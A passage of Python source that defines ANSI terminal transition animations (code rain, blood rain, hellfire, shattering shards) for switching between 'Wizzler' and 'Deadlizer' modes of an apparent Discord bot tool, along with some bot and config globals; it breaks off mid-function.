        if frame % 2 == 0 and len(active_nodes) < len(nodes):
            inactive = [n for n in nodes if not n['active']]
            if inactive:
                new_node = random.choice(inactive)
                new_node['active'] = True
                active_nodes.append(new_node)
        
        # Draw connections
        for n1 in active_nodes:
            grid[n1['y']][n1['x']] = "◉"
            cgrid[n1['y']][n1['x']] = (255, 255, 255)
            for n2 in active_nodes:
                if n1 != n2:
                    dist = math.hypot(n1['x'] - n2['x'], n1['y'] - n2['y'])
                    if dist < 15:
                        steps = int(dist)
                        for s in range(1, steps):
                            nx = int(n1['x'] + (n2['x'] - n1['x']) * (s / steps))
                            ny = int(n1['y'] + (n2['y'] - n1['y']) * (s / steps))
                            if 0 <= nx < cols and 0 <= ny < rows:
                                grid[ny][nx] = random.choice(".-*")
                                r = int(WIZZLER_START[0]*(1-t) + WIZZLER_END[0]*t)
                                g = int(WIZZLER_START[1]*(1-t) + WIZZLER_END[1]*t)
                                b = int(WIZZLER_START[2]*(1-t) + WIZZLER_END[2]*t)
                                cgrid[ny][nx] = (r, g, b)
        
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.03)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _wizzler_switch_void():
    """VOID CORE: Implosion black hole expanding into Wizzler colors."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    cx, cy = cols // 2, rows // 2
    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames
        radius = abs(math.sin(t * math.pi)) * (cols / 1.5)

        for r_idx in range(rows):
            for c_idx in range(cols):
                dist = math.hypot((c_idx - cx) * 0.5, r_idx - cy)
                if dist < radius:
                    if dist > radius - 3:
                        grid[r_idx][c_idx] = random.choice("▓▒░")
                        r = int(WIZZLER_START[0]*(1-t) + WIZZLER_END[0]*t)
                        g = int(WIZZLER_START[1]*(1-t) + WIZZLER_END[1]*t)
                        b = int(WIZZLER_START[2]*(1-t) + WIZZLER_END[2]*t)
                        cgrid[r_idx][c_idx] = (r, g, b)
                    else:
                        if random.random() < 0.1:
                            grid[r_idx][c_idx] = random.choice("*+.")
                            cgrid[r_idx][c_idx] = (200, 200, 255)
        
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _wizzler_switch_quantum():
    """QUANTUM PHASE: Vertical light beams washing the screen with Wizzler aura."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    beams = [{'x': random.randint(0, cols-1), 'speed': random.uniform(1.0, 3.0), 'y': rows} for _ in range(40)]
    frames = 40
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames

        for beam in beams:
            beam['y'] -= beam['speed']
            ix = int(beam['x'])
            iy = int(beam['y'])
            for yy in range(rows):
                if yy >= iy:
                    grid[yy][ix] = "█"
                    r = int(WIZZLER_START[0]*(1-t) + WIZZLER_END[0]*t)
                    g = int(WIZZLER_START[1]*(1-t) + WIZZLER_END[1]*t)
                    b = int(WIZZLER_START[2]*(1-t) + WIZZLER_END[2]*t)
                    cgrid[yy][ix] = (r, g, b)
        
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")


def _deadlizer_switch_terminal_melt():
    """TERMINAL MELT: The screen drips down in viscous crimson layers."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    offsets = [0.0] * cols
    speeds = [random.uniform(0.2, 1.5) for _ in range(cols)]
    
    frames = 50
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames
        for c in range(cols):
            offsets[c] += speeds[c]
            melt_y = int(offsets[c])
            for y in range(melt_y + 1):
                if 0 <= y < rows:
                    grid[y][c] = random.choice("█▓▒░")
                    intensity = 1.0 - (y / max(melt_y, 1)) * 0.5
                    r = int(DEADLIZER_START[0] * intensity)
                    g = int(DEADLIZER_START[1] * intensity * 0.2)
                    b = int(DEADLIZER_START[2] * intensity * 0.2)
                    cgrid[y][c] = (r, g, b)
        
        for r_idx in range(rows):
            out = "".join(f"\033[38;2;{cgrid[r_idx][c][0]};{cgrid[r_idx][c][1]};{cgrid[r_idx][c][2]}m{grid[r_idx][c]}" if grid[r_idx][c] != " " else " " for c in range(cols))
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.015)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _deadlizer_switch_phantom_shards():
    """PHANTOM SHARDS: Crystalline crimson explosion that shatters the screen."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    shards = []
    for _ in range(150):
        shards.append({'x': cols//2, 'y': rows//2, 'vx': random.uniform(-5, 5), 'vy': random.uniform(-3, 3), 'char': random.choice("◆◇◈◊"), 'life': 1.0})
    for frame in range(35):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        t = frame / 34
        for s in shards:
            s['x'] += s['vx']
            s['y'] += s['vy']
            s['life'] -= 0.04 # Faster decay
            if s['life'] > 0:
                ix, iy = int(s['x']), int(s['y'])
                if 0 <= ix < cols and 0 <= iy < rows:
                    grid[iy][ix] = s['char']
                    r = int(DEADLIZER_START[0] * s['life'] + 255 * (1-s['life']) * t)
                    cgrid[iy][ix] = (r, 10, 20)
        for r_idx in range(rows):
            out = "".join(f"\033[38;2;{cgrid[r_idx][c][0]};{cgrid[r_idx][c][1]};{cgrid[r_idx][c][2]}m{grid[r_idx][c]}" if grid[r_idx][c] != " " else " " for c in range(cols))
            sys.stdout.write(out + "\n")
        sys.stdout.flush()
        time.sleep(0.008) # Super fast
    skipper.stop()

def _deadlizer_switch_void_pulse():
    """VOID PULSE: Rhythmic dark singularity that pulls the screen inward."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    cx, cy = cols//2, rows//2
    for frame in range(40):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 39
        pulse = math.sin(t * math.pi * 6) * 0.5 + 0.5 # More pulses
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                dist = math.sqrt((c_idx-cx)**2 + ((r_idx-cy)*2.2)**2)
                if abs(dist - (1-t) * 60) < 6 * pulse:
                    r = int(DEADLIZER_START[0] * pulse)
                    out += f"\033[38;2;{r};0;0m" + random.choice("█▓▒░")
                else: out += " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.007)
    skipper.stop()

def _deadlizer_switch_glitch_vortex():
    """GLITCH VORTEX: Chaotic scanline distortion and color-shifted trails."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(35):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        for r_idx in range(rows):
            offset = int(math.sin(frame * 0.7 + r_idx * 0.3) * 15)
            out = " " * max(0, offset)
            for c_idx in range(cols):
                if random.random() < 0.15:
                    r = random.randint(150, 255); out += f"\033[38;2;{r};0;0m" + random.choice("!@#$%^")
                elif random.random() < 0.05:
                    out += f"\033[38;2;255;255;255m{random.choice('█▓▒░')}"
                else: out += " "
            sys.stdout.write(out[:cols] + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.01)
    skipper.stop()

def _deadlizer_switch_crimson_nebula():
    """CRIMSON NEBULA: Swirling blood-mists and ethereal particles."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    particles = [{'x': random.uniform(0, cols), 'y': random.uniform(0, rows), 'angle': random.uniform(0, math.pi*2), 'v': random.uniform(1.5, 4)} for _ in range(150)]
    for frame in range(40):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        for p in particles:
            p['x'] = (p['x'] + math.cos(p['angle']) * p['v']) % cols
            p['y'] = (p['y'] + math.sin(p['angle']) * p['v'] * 0.5) % rows
            ix, iy = int(p['x']), int(p['y'])
            if 0 <= ix < cols and 0 <= iy < rows:
                grid[iy][ix] = random.choice("≈≋~∿")
        for r_idx in range(rows):
            out = "".join(f"\033[38;2;{DEADLIZER_START[0]};20;40m{grid[r_idx][c]}" if grid[r_idx][c] != " " else " " for c in range(cols))
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.008)
    skipper.stop()

def _deadlizer_switch_eternal_static():
    """ETERNAL STATIC: Visual white-noise corruption and feedback loops."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(30):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        for _ in range(rows):
            out = "".join(f"\033[38;2;{random.randint(40,255)};0;{random.randint(0,20)}m" + random.choice(" ░▒▓█╬╠╣") for _ in range(cols))
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.006)
    skipper.stop()

def _deadlizer_switch_demon_scan():
    """DEMON SCAN: Searing vertical beam sweep that burns the screen."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(35):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        scan_x = int((frame/34) * cols)
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                if c_idx == scan_x: out += f"\033[38;2;255;255;255m█"
                elif abs(c_idx-scan_x) < 8: 
                    dist = abs(c_idx-scan_x)/8
                    r = int(255 * (1-dist) + DEADLIZER_START[0] * dist)
                    out += f"\033[38;2;{r};0;0m" + random.choice("▓▒░╬")
                else: out += " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.007)
    skipper.stop()

def _wizzler_switch_aurora_stream():
    """AURORA STREAM: Neon flowing lines that paint the banner."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(45):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 44
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                val = math.sin(c_idx * 0.15 + t * 7 + r_idx * 0.25)
                if val > 0.75:
                    r = int(WIZZLER_START[0] * t); g = int(WIZZLER_START[1]); b = int(WIZZLER_START[2])
                    out += f"\033[38;2;{r};{g};{b}m" + random.choice("~≈≋∿")
                else: out += " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.009)
    skipper.stop()

def _wizzler_switch_digital_decay():
    """DIGITAL DECAY: Reverse-entropy effect where noise organizes into the banner."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(40):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 39
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                if random.random() > t * 1.5:
                    out += f"\033[38;2;60;60;60m" + random.choice("01")
                else:
                    r = int(WIZZLER_START[0] * t + 100 * (1-t))
                    out += f"\033[38;2;{r};{WIZZLER_START[1]};{WIZZLER_START[2]}m" + random.choice("█▓▒░")
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.01)
    skipper.stop()

def _wizzler_switch_quantum_leap():
    """QUANTUM LEAP: Fast-paced jump effect with starfield particles."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    stars = [{'x': random.uniform(-1, 1), 'y': random.uniform(-1, 1), 'z': random.uniform(0.1, 1)} for _ in range(250)]
    for frame in range(35):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        for s in stars:
            s['z'] -= 0.05 # Faster leap
            if s['z'] <= 0: s['z'] = 1
            sx = int(cols//2 + (s['x'] / s['z']) * cols//3)
            sy = int(rows//2 + (s['y'] / s['z']) * rows//3)
            if 0 <= sx < cols and 0 <= sy < rows:
                grid[sy][sx] = "." if s['z'] > 0.4 else "█"
        for r_idx in range(rows):
            out = "".join(f"\033[38;2;0;255;255m{grid[r_idx][c]}" if grid[r_idx][c] != " " else " " for c in range(cols))
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.008)
    skipper.stop()

def _wizzler_switch_synth_wave():
    """SYNTH WAVE: Retro grid-line expansion from the horizon."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(45):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 44
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                persp = max(0.1, (r_idx / rows))
                if abs(math.sin(c_idx * 0.12 / persp + t * 6)) < 0.12 or abs(math.sin(r_idx * 0.6 + t * 12)) < 0.12:
                    r, g, b = hsv_to_rgb(300 + t * 60, 0.9, 1.0)
                    out += f"\033[38;2;{r};{g};{b}m" + random.choice("┼┴┬┤├─")
                else: out += " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.01)
    skipper.stop()

def _wizzler_switch_binary_flood():
    """BINARY FLOOD: Fast-scrolling 0s and 1s that fill the terminal."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    for frame in range(35):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        for _ in range(rows):
            line = "".join(random.choice("01") for _ in range(cols))
            out = f"\033[38;2;0;255;128m{line}"
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.007)
    skipper.stop()

def _wizzler_switch_plasma_shield():
    """PLASMA SHIELD: Geometric shield convergence on the center."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30
    cx, cy = cols//2, rows//2
    for frame in range(40):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        t = frame / 39
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                dist = max(abs(c_idx-cx), abs(r_idx-cy)*2.5)
                if abs(dist - (1-t) * 80) < 4: out += f"\033[38;2;0;255;255m█"
                elif abs(dist - (1-t) * 80) < 10: out += f"\033[38;2;0;100;100m▒"
                else: out += " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.009)
    skipper.stop()

def _wizzler_switch_matrix_neon():
    """MATRIX NEON: Vertical code rain in Wizzler gradients."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    drops = [{'x': random.randint(0, cols-1), 'y': random.uniform(-rows, 0), 'speed': random.uniform(0.5, 2.5), 'chars': [random.choice("01ｦｧｨｩｪｫｬｭｮｯ") for _ in range(15)]} for _ in range(80)]
    
    frames = 60
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames
        for d in drops:
            d['y'] += d['speed']
            if d['y'] > rows + 15:
                d['y'] = random.uniform(-15, 0)
                d['x'] = random.randint(0, cols-1)
            
            for i, ch in enumerate(d['chars']):
                yy = int(d['y']) - i
                if 0 <= yy < rows:
                    grid[yy][d['x']] = ch
                    ratio = i / 15
                    r = int(WIZZLER_START[0] * (1-ratio) + (255 if i == 0 else 0) * ratio)
                    g = int(WIZZLER_START[1] * (1-ratio) + (255 if i == 0 else 0) * ratio)
                    b = int(WIZZLER_START[2] * (1-ratio) + (255 if i == 0 else 0) * ratio)
                    cgrid[yy][d['x']] = (r, g, b)
        
        for r_idx in range(rows):
            out = "".join(f"\033[38;2;{cgrid[r_idx][c][0]};{cgrid[r_idx][c][1]};{cgrid[r_idx][c][2]}m{grid[r_idx][c]}" if grid[r_idx][c] != " " else " " for c in range(cols))
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _deadlizer_switch_shatter_v2():
    """SHATTER V2: Screen breaks into chaotic shards that tumble into darkness."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    shards = []
    for _ in range(200):
        shards.append({
            'x': random.uniform(0, cols), 'y': random.uniform(0, rows),
            'vx': random.uniform(-3, 3), 'vy': random.uniform(-2, 5),
            'life': 1.0, 'char': random.choice("/\\|_-+*"),
            'rot': random.uniform(0, math.pi*2), 'rv': random.uniform(-0.5, 0.5)
        })
    
    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        for s in shards:
            s['x'] += s['vx']
            s['y'] += s['vy']
            s['vy'] += 0.2 # Gravity
            s['rot'] += s['rv']
            s['life'] -= 0.02
            if s['life'] > 0:
                ix, iy = int(s['x']), int(s['y'])
                if 0 <= ix < cols and 0 <= iy < rows:
                    grid[iy][ix] = s['char']
                    r = int(DEADLIZER_START[0] * s['life'])
                    g = int(DEADLIZER_START[1] * s['life'] * 0.1)
                    b = int(DEADLIZER_START[2] * s['life'] * 0.1)
                    cgrid[iy][ix] = (r, g, b)
        
        for r_idx in range(rows):
            out = "".join(f"\033[38;2;{cgrid[r_idx][c][0]};{cgrid[r_idx][c][1]};{cgrid[r_idx][c][2]}m{grid[r_idx][c]}" if grid[r_idx][c] != " " else " " for c in range(cols))
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.015)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _wizzler_switch_glitch_scan():
    """GLITCH SCAN: A horizontal scanline that rewrites the terminal into Wizzler colors."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    frames = 50
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        scan_y = int((frame / frames) * rows)
        
        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                if r_idx == scan_y:
                    r, g, b = 255, 255, 255
                    ch = "█"
                elif r_idx < scan_y:
                    ratio = c_idx / cols
                    r = int(WIZZLER_START[0] * (1-ratio) + WIZZLER_END[0] * ratio)
                    g = int(WIZZLER_START[1] * (1-ratio) + WIZZLER_END[1] * ratio)
                    b = int(WIZZLER_START[2] * (1-ratio) + WIZZLER_END[2] * ratio)
                    ch = random.choice("■█▓▒░") if random.random() < 0.05 else " "
                else:
                    if random.random() < 0.02:
                        r, g, b = 50, 50, 50
                        ch = random.choice("!@#$%^")
                    else:
                        ch = " "
                
                if ch != " ":
                    out += f"\033[38;2;{r};{g};{b}m{ch}"
                else:
                    out += " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")


async def switch_to_wizzler():
    global __mode__, WIZZLER_START, WIZZLER_END, __max_concurrent__
    __mode__ = "wizzler"
    # Reset concurrency to standard mode
    __max_concurrent__ = __config__.get("max_concurrent", 50)
    WIZZLER_START, WIZZLER_END = pick_random_gradient()
    
    effect = random.choice([
        _cyberpunk_effect, 
        _wizzler_switch_hyperdrive, 
        _wizzler_switch_neural, 
        _wizzler_switch_void, 
        _wizzler_switch_quantum,
        _wizzler_switch_matrix_neon,
        _wizzler_switch_glitch_scan,
        _wizzler_switch_aurora_stream,
        _wizzler_switch_digital_decay,
        _wizzler_switch_quantum_leap,
        _wizzler_switch_synth_wave,
        _wizzler_switch_binary_flood,
        _wizzler_switch_plasma_shield
    ])

    sys.stdout.write("\033[?25l") # Hide cursor for transition
    sys.stdout.flush()
    
    try:
        if asyncio.iscoroutinefunction(effect):
            await effect()
        else:
            effect()
    finally:
        sys.stdout.write("\033[?25h") # Re-show cursor
        sys.stdout.flush()
        
    return True


__bot_user_id__ = None
__bot_user_name__ = None
__bot_user_discriminator__ = None
__bot_guilds__ = []

__config__ = None
__loaded_configs__ = {}
__current_config_name__ = None
__config_index__ = 0
config_folder = "configs"

def _deadlizer_switch_blood_rain():
    """BLOOD RAIN: Heavy, viscous crimson rain that floods the screen."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    drops = [{'x': c, 'y': random.uniform(-rows, 0), 'speed': random.uniform(0.5, 2.0), 'len': random.randint(3, 10)} for c in range(cols) if random.random() > 0.3]
    pool = [0.0] * cols
    
    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames

        # Update and draw drops
        for d in drops:
            d['y'] += d['speed'] * (1.0 + t * 2)
            c = d['x']
            y_int = int(d['y'])
            if y_int > rows - pool[c]:
                pool[c] = min(rows, pool[c] + random.uniform(0.1, 0.4))
                d['y'] = random.uniform(-10, -1)
                d['speed'] = random.uniform(0.5, 2.0)
            else:
                for seg in range(d['len']):
                    sy = y_int - seg
                    if 0 <= sy < rows:
                        grid[sy][c] = "│" if seg > 0 else random.choice("╽▼")
                        intensity = 1.0 - (seg / d['len'])
                        r = min(255, int((DEADLIZER_START[0]*(1-t) + DEADLIZER_END[0]*t) * intensity))
                        g = min(255, int((DEADLIZER_START[1]*(1-t) + DEADLIZER_END[1]*t) * intensity * 0.5))
                        b = min(255, int((DEADLIZER_START[2]*(1-t) + DEADLIZER_END[2]*t) * intensity * 0.5))
                        cgrid[sy][c] = (r, g, b)

        # Draw pool
        for c in range(cols):
            p = int(pool[c] * t * 2)
            for y in range(rows - p, rows):
                if 0 <= y < rows:
                    grid[y][c] = random.choice("▓▒░≈~")
                    r = int(DEADLIZER_START[0]*(1-t) + DEADLIZER_END[0]*t)
                    g = int(DEADLIZER_START[1]*(1-t) + DEADLIZER_END[1]*t)
                    b = int(DEADLIZER_START[2]*(1-t) + DEADLIZER_END[2]*t)
                    cgrid[y][c] = (r, min(255,g+10), min(255,b+10))

        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _deadlizer_switch_hellfire():
    """HELLFIRE VORTEX: Rising violent inferno from below."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    fire_chars = " ░▒▓█"
    fire_grid = [[0 for _ in range(cols)] for _ in range(rows+2)]
    
    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames

        # Ignite bottom row
        for c in range(cols):
            fire_grid[rows][c] = 4 if random.random() < (0.5 + t*0.5) else 0

        # Propagate fire upwards
        for r_idx in range(rows-1, -1, -1):
            for c_idx in range(cols):
                src1 = fire_grid[r_idx+1][(c_idx-1)%cols]
                src2 = fire_grid[r_idx+1][c_idx]
                src3 = fire_grid[r_idx+1][(c_idx+1)%cols]
                decay = 1 if random.random() < 0.4 else 0
                val = max(0, int((src1 + src2 + src3) / 3) - decay)
                fire_grid[r_idx][c_idx] = val
                if val > 0:
                    grid[r_idx][c_idx] = fire_chars[min(val, len(fire_chars)-1)]
                    if val > 3:
                        cgrid[r_idx][c_idx] = (255, 200, 0) # Intense core
                    elif val > 2:
                        cr = int(DEADLIZER_START[0]*(1-t) + DEADLIZER_END[0]*t)
                        cg = int(DEADLIZER_START[1]*(1-t) + DEADLIZER_END[1]*t)
                        cb = int(DEADLIZER_START[2]*(1-t) + DEADLIZER_END[2]*t)
                        cgrid[r_idx][c_idx] = (cr, cg, cb)
                    else:
                        cgrid[r_idx][c_idx] = (150, 20, 20) # Ember fading

        # Occasional violent bursts
        if random.random() < 0.3:
            burst_x = random.randint(0, cols-1)
            burst_h = random.randint(5, rows-5)
            for by in range(rows-1, rows-burst_h, -1):
                grid[by][burst_x] = "█"
                cgrid[by][burst_x] = (255, random.randint(50, 150), 0)

        for r_idx in range(rows):
            out = ""
            for c_idx in range(cols):
                ch = grid[r_idx][c_idx]
                cr, cg, cb = cgrid[r_idx][c_idx]
                out += f"\033[38;2;{cr};{cg};{cb}m{ch}" if ch != " " else " "
            sys.stdout.write(out + "\033[0m\n")
        sys.stdout.flush()
        time.sleep(0.02)
    skipper.stop()
    os.system("cls") if os.name == "nt" else os.system("clear")

def _deadlizer_switch_abyssal():
    """ABYSSAL SHATTER: Reality breaking apart in jagged obsidian spikes."""
    import sys, math, random, time
    os.system("cls") if os.name == "nt" else os.system("clear")
    skipper = _AnimationSkipper(required_presses=2)
    skipper.start()
    try:
        cols, rows = os.get_terminal_size()
    except Exception:
        cols, rows = 120, 30

    cracks = []
    frames = 45
    for frame in range(frames):
        if skipper.should_skip: break
        sys.stdout.write("\033[H")
        grid = [[" "] * cols for _ in range(rows)]
        cgrid = [[(0,0,0)] * cols for _ in range(rows)]
        
        t = frame / frames

        # Add new crack heads
        if frame % 2 == 0:
            cracks.append({'x': random.choice([0, cols-1]), 'y': random.randint(0, rows-1), 'dx': random.uniform(-2, 2), 'dy': random.uniform(-1, 1), 'history': []})

        for crack in cracks:
            crack['x'] += crack['dx'] + random.uniform(-0.5, 0.5)
            crack['y'] += crack['dy'] + random.uniform(-0.5, 0.5)
            crack['history'].append((int(crack['x']), int(crack['y'])))
            
            hx, hy = -1, -1
            for px, py in crack['history']:
                if 0 <= px < cols and 0 <= py < rows:
                    if random.random() < 0.6:
                        grid[py][px] = random.choice("\\|X/")
                        cr = int(DEADLIZER_START[0]*(1-t) + DEADLIZER_END[0]*t)
